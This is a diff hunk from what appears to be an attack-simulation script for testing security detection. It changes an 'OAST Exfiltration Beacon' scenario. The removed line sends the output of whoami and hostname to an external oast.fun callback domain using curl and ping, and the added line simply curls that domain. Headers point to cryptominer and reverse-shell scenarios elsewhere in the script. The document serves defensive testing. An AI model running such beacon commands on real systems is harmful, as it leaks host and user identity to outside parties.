@@ -190,7 +190,7 @@ run_attack "10" "⛏️" "Cryptominer Download Attempt" \
 run_attack "11" "📡" "OAST Exfiltration Beacon" \
     "Exfiltrates data via HTTP callback to attacker-controlled OAST domain" \
     "Data Exfiltration / C2 Callback" \
-    'curl -s "http://$(whoami)-$(hostname).aezukuqsjqlaoghyjmiw9mg769uqgs4gb.oast.fun/exfil?user=$(whoami)&host=$(hostname)" --connect-timeout 3 > /tmp/oast-response.txt 2>&1; ping -c 1 $(whoami).aezukuqsjqlaoghyjmiw9mg769uqgs4gb.oast.fun > /dev/null 2>&1 || true'
+    'curl -s http://script-oast-test.aezukuqsjqlaoghyjmiw9mg769uqgs4gb.oast.fun/exfil --connect-timeout 3'
 
 # ═══════════════════════════════════════════════════════════════
 # PHASE 5: Reverse Shell
